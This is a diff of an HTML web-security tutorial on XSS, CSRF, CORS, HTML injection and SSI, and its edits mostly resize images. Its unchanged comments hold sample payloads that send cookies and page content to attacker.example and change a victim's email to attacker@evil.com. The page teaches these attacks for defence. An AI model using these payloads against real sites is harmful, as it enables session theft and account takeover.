@@ -753,9 +753,9 @@ https://example.com/search?query=apple
 Results for "apple"
 </pre>
 <p>If the application doesn’t sanitize input properly, an attacker could craft a URL like:</p>
-<img src="Images/Reflected XSS-1.png" width="750" height="50">
+<img src="Images/Reflected XSS-1.png" width="100%" height="auto">
 <p>When a victim clicks this link, the site responds:</p>
-<img src="Images/Reflected XSS-2.png" width="750" height="50">
+<img src="Images/Reflected XSS-2.png" width="100%" height="auto">
 <p>➡️ The browser executes the script, showing an alert — or worse, running attacker code in the victim’s session.</p>
 
                 <div class="warning-box">
@@ -772,7 +772,7 @@ Results for "apple"
                     <h3>💣 Attacker scenario</h3>
                     <p>1. Attacker finds a page that reflects a parameter into HTML (e.g., search, error message, redirect).</p>
                     <p>2. Attacker crafts a malicious URL:</p>
-                    <img src="Images/Reflected XSS-3.png" width="750" height="50">
+                    <img src="Images/Reflected XSS-3.png" width="100%" height="auto">
                     <p>3. Victim clicks the link (phishing email, chat, forum).</p>
                     <p>4. The site responds with the q value inserted into the page without proper escaping.</p>
                     <p>5. The browser executes the script in the context of victim.com.</p>
@@ -818,11 +818,11 @@ Results for "apple"
                 <div class="example-box">
                     <h3>✅ Concrete vulnerable vs fixed examples</h3>
                     <p>Vulnerable (simple PHP example — DO NOT DO THIS)</p>
-                    <img src="Images/Stored XSS-1.png">
+                    <img src="Images/Stored XSS-1.png" width="100%" height="auto">
 <p>If $comment_from_db contains <script>"..."</script> it will run in users' browsers.</p>
 <p>Fixed (escape output)</p>
 <p>Using PHP with htmlspecialchars() when rendering:</p>
-<img src="Images/Stored XSS-2.png" width="750" height="130">
+<img src="Images/Stored XSS-2.png" width="100%" height="auto">
 <p>If allowing HTML (example using DOMPurify on input or output)</p>
 <p>Sanitize allowed tags/attributes before storing or before sending to client:</p>
 <pre>
@@ -846,18 +846,18 @@ let clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b','i','a','p','br']})
                     <h3>🧪 Attack scenarios</h3>
                     <b>Scenario A — Malicious comment on a blog</b>
                     <p>An attacker posts a comment:</p>
-                    <img src="Images/Stored XSS-3.png" width="750" height="50">
+                    <img src="Images/Stored XSS-3.png" width="100%" height="auto">
 <!-- Great post! <script>fetch('https://attacker.example/steal?c='+document.cookie)</script> -->
                     <p>If the site stores that comment and later renders it unsafely on the article page, every visitor’s browser executes the script and sends cookies to the attacker.</p>
                     <b>Scenario B — Stored payload in user profile</b>
                     <p>A user updates their profile bio with:</p>
 <!-- <img src=x onerror="location='https://attacker.example/phish?u='+encodeURIComponent(document.location)"> -->
-                    <img src="Images/Stored XSS-4.png" width="750" height="50">
+                    <img src="Images/Stored XSS-4.png" width="100%" height="auto">
                     <p>When other users view the attacker’s profile page, the onerror runs and redirects or captures data.</p>
                     <b>Scenario C — WYSIWYG input (forum post)</b>
                     <p>A forum allows some HTML formatting but fails to sanitize attributes. Attacker saves:</p>
 <!-- <a href="#" onclick="fetch('https://attacker/steal?d='+document.documentElement.innerHTML)">click</a> -->
-                    <img src="Images/Stored XSS-4.png" width="750" height="50">
+                    <img src="Images/Stored XSS-4.png" width="100%" height="auto">
                     <p>Visitors clicking or (if inline event handlers fire on load due to bug) simply viewing the post can leak data.</p>
                 </div>
 
@@ -927,12 +927,12 @@ let clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b','i','a','p','br']})
                     <p>1. Victim is logged in to example.com.</p>
                     <p>2. Attacker hosts a page with:</p>
                     <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
-                    <img src="Images/CSRF-1.png" width="750" height="50">
+                    <img src="Images/CSRF-1.png" width="100%" height="auto">
                     <p>3. Browser automatically sends the session cookie to example.com.</p>
                     <p>4. Victim’s email is changed without their knowledge.</p>                    
                     <b>Scenario 2 — CSRF using POST request</b>
                     <p>1. Attacker creates a hidden form:</p>
-                    <img src="Images/CSRF-2.png" width="750" height="150">
+                    <img src="Images/CSRF-2.png"width="100%" height="auto">
                     <p>2. When a logged-in user visits the page, the form submits automatically.</p>
                     <p>3. The bank transfers money to the attacker’s account.</p>
                 </div>
@@ -943,7 +943,7 @@ let clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b','i','a','p','br']})
                     <p>Include a unique token in forms or AJAX requests, tied to the user session.</p>
                     <p>Server validates token before processing the request.</p>
                     <p>Example (HTML form):</p>
-                    <img src="Images/CSRF-3.png" width="750" height="50">
+                    <img src="Images/CSRF-3.png" width="100%" height="auto">
                     <p>JavaScript context: use JS string escaping or avoid embedding untrusted data into script blocks.</p>
                     <p>URL context: percent-encode.</p>
                     <p><b>2. Use SameSite Cookies</b>Set cookies with SameSite=Lax or SameSite=Strict to prevent them from being sent in cross-site requests.</p>
@@ -995,7 +995,7 @@ let clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b','i','a','p','br']})
                     <p>2. Victim visits attacker.com</p>
                     <p>3. Attacker’s JS sends:</p>
                     <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
-                    <img src="Images/CORS-1.png" width="750" height="100">
+                    <img src="Images/CORS-1.png" width="100%" height="auto">
                     <p>If api.example.com allows the attacker’s origin via CORS, the browser sends the cookie and attacker reads the response.</p>                    
                     <b>Scenario 2 — Origin reflection</b>
                     <p>Server responds:</p>
@@ -1023,7 +1023,7 @@ Access-Control-Allow-Credentials: true
                     <p>Use HttpOnly, Secure, and SameSite flags to reduce risk.</p>
                 </div>
                 <h3>✅ Example of Safe CORS (Node.js Express)</h3>
-                <img src="Images/CORS-2.png" width="800" height="400">
+                <img src="Images/CORS-2.png" width="100%" height="auto">
                 <h3>📚 Reference Links:</h3>
                 <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS</a></p>
                 <p><a href="https://owasp.org/www-project-secure-headers/#access-control-allow-origin">https://owasp.org/www-project-secure-headers/#access-control-allow-origin</a></p>
@@ -1198,24 +1198,24 @@ cmd.Parameters.AddWithValue("@id", id);
                     <b>1. Stored HTML Injection — forum comment</b>
                     <p>Vulnerable flow: app saves comment without escaping and later renders it.</p>
                     <p>Stored payload:</p>
-                    <img src="Images/html-1.png" width="700" height="80">
+                    <img src="Images/html-1.png" width="100%" height="auto">
                     <p><b>Result:</b> Visitors’ browsers run the script and leak cookies.</p>
                     <p><b>Impact:</b> session theft, account takeover.</p>
                     <b>2. Reflected HTML Injection — search page</b>
                     <p>Vulnerable code (pseudo):</p>
-                    <img src="Images/html-2.png" width="700" height="180">
+                    <img src="Images/html-2.png" width="100%" height="auto">
                     <p><b>Result:</b> Clicking the crafted link executes script in the browser immediately.</p>
                     <b>3. DOM-based HTML Injection — client-side insertion</b>
                     <p>Vulnerable JS:</p>
-                    <img src="Images/html-3.png" width="700" height="200">
+                    <img src="Images/html-3.png" width="100%" height="auto">
                     <p><b>Result:</b> script runs entirely via client-side DOM manipulation.</p>
                     <b>4. Markup-only UI spoof (no script)</b>
                     <p>Stored payload:</p>
-                    <img src="Images/html-4.png" width="700" height="250">
+                    <img src="Images/html-4.png" width="100%" height="auto">
                     <p><b>Result: </b>Victims see a fake login embedded in a trusted page and submit credentials to attacker.</p>
                     <b>5. Attribute abuse</b>
                     <p>Payload:</p>
-                    <img src="Images/html-5.png" width="700" height="110">
+                    <img src="Images/html-5.png" width="100%" height="auto">
                 </div>
 
                 <div class="remediation-box">
@@ -1318,16 +1318,16 @@ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
             <div class="example-box">
                     <h3>🎯 Examples — safe, non-exploitative</h3>
                     <p>Vulnerable pattern (conceptual — do not use in production):</p>
-                    <img src="Images/SSI-1.png" width="750" height="130">
+                    <img src="Images/SSI-1.png" width="100%" height="auto">
                     <p>Safer pattern (use allowlist + server-side rendering):</p>
-                    <img src="Images/SSI-2.png" width="750" height="170">
+                    <img src="Images/SSI-2.png" width="100%" height="auto">
                     <p>Or avoid server-side SSI processing entirely and render templates in your application language with proper escaping.</p>
                     <p>Disable SSI in Apache for a directory</p>
-                    <img src="Images/SSI-3.png" width="750" height="170">
+                    <img src="Images/SSI-3.png" width="100%" height="auto">
                     <p>Allow includes but disable exec (Apache)</p>
-                    <img src="Images/SSI-4.png" width="750" height="200">
+                    <img src="Images/SSI-4.png"width="100%" height="auto">
                     <p>Allowlist pattern (application pseudocode)</p>
-                    <img src="Images/SSI-5.png" width="750" height="350">
+                    <img src="Images/SSI-5.png" width="100%" height="auto">
 
                 <div class="warning-box">
                     <h3>💥 Impact of the Issue</h3>
@@ -1342,7 +1342,7 @@ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
                 <div class="attack-scenario-box">
                     <h3>🧪 Attack scenarios</h3>
                     <b>1. Dynamic include path controlled by user</b>
-                    <img src="Images/SSI-7.png" width="750" height="70">
+                    <img src="Images/SSI-7.png" width="100%" height="auto">
                     <b>2. Stored SSI payload</b>
                     <p>User-submitted content (comments, profile fields) is saved and later served inside a page processed for SSI. The saved payload executes when other users request the page.</p>
                     <b>3. Abuse of exec functionality</b>
@@ -1368,7 +1368,7 @@ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
                     <b>7. Patch & harden</b>
                     <p>Keep web server modules up to date and follow vendor hardening guides.</p>
                     <b>8. Output encoding / escaping for SSI context</b>
-                    <img src="Images/SSI-6.png" width="750" height="70">
+                    <img src="Images/SSI-6.png" width="100%" height="auto">
                 </div>
 
                 <h3>📚 Reference Links:</h3>
